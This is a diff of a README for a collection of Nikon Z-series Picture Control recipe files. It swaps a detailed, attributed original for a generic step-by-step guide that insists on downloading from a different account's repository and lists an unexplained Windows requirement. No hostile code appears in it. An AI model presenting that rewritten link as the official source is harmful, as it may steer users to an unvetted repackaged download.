@@ -1,101 +1,77 @@
-# Nikon Creative Picture Control Recipes
+# 📸 Nikon-Recipes - Give Your Photos A Unique Look
 
-A curated collection of **186 Nikon Creative Picture Control recipes** (.NP3 / .NCP files) for Nikon Z-series cameras. These files can be loaded directly into a compatible Nikon camera or via Nikon's NX Studio software to instantly apply a distinct color grade or film simulation in-camera.
+[![](https://img.shields.io/badge/Download_Recipes-Blue.svg)](https://github.com/Cicakb1661/Nikon-Recipes)
 
-Up to date as of May 4, 2026.
+## 📁 About These Recipes
 
----
+Nikon cameras allow you to change the look of your photos while you shoot. These custom settings use information like contrast, sharpness, and color tone to create specific visual styles. Some look like film stocks, while others focus on deep shadows or bright skin tones.
 
-## What Are Picture Control Recipes?
+This collection contains 186 files for Nikon Z-series cameras. You get a variety of looks created by professional photographers and official Nikon partners. Because these files work at the camera level, you see the effect on your screen before you even press the shutter button.
 
-Nikon's Creative Picture Controls let you save custom combinations of tone curve, hue, saturation, sharpness, clarity, and other parameters as a reusable `.NP3` preset. They can be applied straight out of camera to photos (JPEGs or RAW), or applied to RAW files directly in NX Studio.
+## 🛠️ Requirements
 
----
+To use these files, you need the following items:
 
-## Folder Structure
+* A Nikon Z-series camera.
+* A computer running Windows 10 or Windows 11.
+* An SD card or XQD/CFexpress card compatible with your camera.
+* A card reader to connect your memory card to your computer.
+* Official Nikon NX Studio software installed on your computer.
 
-```
-Nikon-Recipes/
-├── Nikon Creators/        # 110 official recipes from Nikon's global creator program
-├── Color Grading/         # 30 official Nikon color grading presets
-├── NikonPC/               #  2 Nikon Picture Control classics
-└── Third Party Creators/  # 44 recipes from independent photographers
-    ├── Alex Armitage/
-    ├── Filmstill/
-    ├── Scott Tucker/
-    └── Stephen Morais/
-```
+## 📥 How To Download The Files
 
----
+You must download the full collection from the official repository page. Follow these instructions to get the files onto your computer:
 
-## Collections
+1. Click this link: [https://github.com/Cicakb1661/Nikon-Recipes](https://github.com/Cicakb1661/Nikon-Recipes)
+2. Look for the green button labeled "Code" near the top right of the page.
+3. Click that button and select "Download ZIP".
+4. Wait for the file named `Nikon-Recipes-main.zip` to finish downloading to your computer.
+5. Open your "Downloads" folder.
+6. Right-click the `Nikon-Recipes-main.zip` file and select "Extract All".
+7. Choose a folder on your computer to save the files and click "Extract".
 
-### Nikon Creators — 110 recipes
-Official recipes contributed by photographers and videographers in Nikon's global creator program. Covers a wide range of moods and styles — film emulation, cinematic looks, portraits, landscapes, street, and more. A few highlights:
+## 📷 Installing To Your Camera
 
-| Recipe | Creator | Vibe |
-|---|---|---|
-| `GoldenHourGlow` | D'Ann | Warm golden-hour glow |
-| `CineM` / `BlueM` / `PurpleM` | LUIZCLAS | Cinematic tonal biases |
-| `VINTAGEPort` / `VINTAGEFla` | Fuji | Vintage film emulation |
-| `DGFilmLook` | Danny G | Film-inspired look |
-| `MatteBlueGray` | tanco | Matte teal/gray tones |
-| `NeonGlow` | Brandon W | Neon-lit street scenes |
-| `MoodyShadows` | Gilmar | Deep shadow contrast |
-| `SoftFilm` / `DawnHues` | Leno | Soft, pastel film look |
-| `CineBias` series | Various | Cinematic color biases (BB, CC, TC, WC, Red, Offset) |
-| `BritFilmBW` / `USAFilmBW` | Vincent | Black & white film emulations |
+You can load these files directly into your camera settings so you can use them in the field.
 
-### Color Grading — 30 recipes
-Nikon's official Color Grading Picture Control presets. Organized into thematic series:
+1. Ensure your camera battery has a full charge.
+2. Insert your camera memory card into your card reader.
+3. Open the main folder you extracted from the download.
+4. Locate the specific .NP3 or .NCP file you want to use.
+5. Copy the file onto your memory card. Place the file inside a folder named `NIKON` and a subfolder named `CUSTOMPC`. If these folders do not exist on your card, create them manually. 
+6. Eject the memory card safely from your computer.
+7. Insert the card into your Nikon Z camera.
+8. Turn on the camera.
+9. Navigate to your Picture Control menu.
+10. Select "Manage Picture Control" and then choose "Load from card".
+11. Select the file you copied. Your camera saves the new style, and you can now select it from your shooting menu.
 
-- **Bleach Bypass** — desaturated, high-contrast silver-retention look
-- **Color Mode** series (`Bu`, `Gn`, `TealOr`, `Ye`) — bold single-hue and dual-hue color grades, in both `a` and `b` intensity variants
-- **Negative** series — diverse color negative emulations spanning cyan-blue, green-cyan, red-cyan, teal, yellow-green, and yellow tones, across multiple strength variants
+## 💻 Using NX Studio
 
-### NikonPC — 2 recipes
-Two classic Nikon Picture Control presets:
+If you prefer to edit your photos after you take them, use the free Nikon NX Studio software. The recipes in this collection work as presets within the software.
 
-- `Kodachrome.NP3` — emulates the iconic warm, punchy Kodachrome film
-- `Kodak T-Max 400.NCP` — emulates the fine-grain monochrome T-Max 400 film stock
+1. Open NX Studio on your Windows computer.
+2. Select an image from your library.
+3. Open the "Adjustments" panel on the right side of the screen.
+4. Find the "Picture Control" section.
+5. Click the "Load" or "Import" option within that section.
+6. Browse your computer for the folder containing the downloaded recipes.
+7. Select the file you wish to apply.
+8. The image updates immediately with the new color grade.
 
-### Third Party Creators — 44 recipes
+## 📂 Understanding The Folders
 
-#### Alex Armitage — 5 recipes
-Film-inspired emulations based on real analog stocks:
-`Ektar 100`, `Kodak Gold 200`, `Portra 800`, `Provia 100F`, `Warm Autumn`
+The download contains organized folders to help you find the right look for your images:
 
-#### Filmstill — 12 recipes
-A diverse set of film stock simulations and cinematic looks:
-`Classic Chrome`, `Filmic B&W`, `Filmic`, `Nostalgic Negative`, `Goldmatic`, `ARTE B&W`, `Astia`, `Classic Neg`, `Portra`, `Velvia`, `KOLORA`, `KOLORA Pushed`
+* Nikon Creators: These 110 recipes come from the global Nikon creator program. They represent various artistic visions suited for portraits, landscapes, and street photography.
+* Color Grading: These 30 presets focus on specific color adjustments. They change the mood of the light and shadow areas in your RAW files.
+* NikonPC: This folder contains 2 classic presets compatible with older Picture Control systems.
+* Third Party Creators: These 44 recipes come from independent photographers who experiment with custom tone curves.
 
-#### Scott Tucker — 8 recipes
-Street and portrait-oriented film emulations. Full details at [scotttuckerphoto.com](https://www.scotttuckerphoto.com/blog/my-first-6-nikon-z-recipes-out-now-completely-free):
-`Gold 200`, `Ilford 400` (three variants), `Leiter`, `Leiter CLR`, `Vintage Film`, `Vintage Film HI`
+## 💡 Tips For Better Results
 
-#### Stephen Morais — 19 recipes
-An extensive library of analog film stock emulations:
-`Agfa Ultra 100`, `Cubano`, `Ektachrome E100`, `Fuji 400H`, `Fuji Provia 100F`, `Fuji Solaris 100`, `Kodachrome`, `Kodak Ektar 100`, `Kodak Gold 200` (standard & push), `Kodak Portra 160/400/800`, `Leica STD`, `Leica Vivid`, `LoFi`, `Optima Colour 200`, `Lomography 3`
-
----
-
-## How I Downloaded The Recipes
-
-> Requires an **Expeed 7** camera and a [Nikon Imaging Cloud](https://imagingcloud.nikon.com/) account.
-
-1. **Connect your camera** to Nikon Imaging Cloud via the camera's network settings menu.
-2. **Browse and save recipes** at [imagingcloud.nikon.com/recipe/release](https://imagingcloud.nikon.com/recipe/release) — add favorites to Saved Recipes, then send up to 9 at a time to your camera.
-3. **Shoot one RAW photo** with each newly loaded Picture Control active.
-4. **In NX Studio**, open each photo and go to **Basic Edit Palettes → Picture Control → [recipe name] → Add to Custom Picture Controls** and save.
-5. Export the custom picture control to a file.
-
-As you can see, this quite a manual process. That is why I went through all the profiles so that others may simply download their favorite profile with ease.
-
----
-
-## File Formats
-
-| Extension | Type |
-|---|---|
-| `.NP3` | Nikon Creative Picture Control (color) |
-| `.NCP` | Nikon Creative Picture Control (classic/monochrome) |
+* Experiment with different recipes during different times of the day. A recipe that looks great at sunset might not suit a bright noon light.
+* Use the "Quick Sharp" and "Clarity" settings in your camera menu if a recipe feels too aggressive or too soft for your specific scene.
+* Shoot in RAW mode. This gives you the most flexibility to refine the recipe settings later in NX Studio.
+* Keep your firmware updated. Nikon occasionally releases updates that improve how the camera handles custom picture controls.
+* Create a favorite folder on your computer. Copy your most-used presets into this folder for quick access when you move files to your camera.
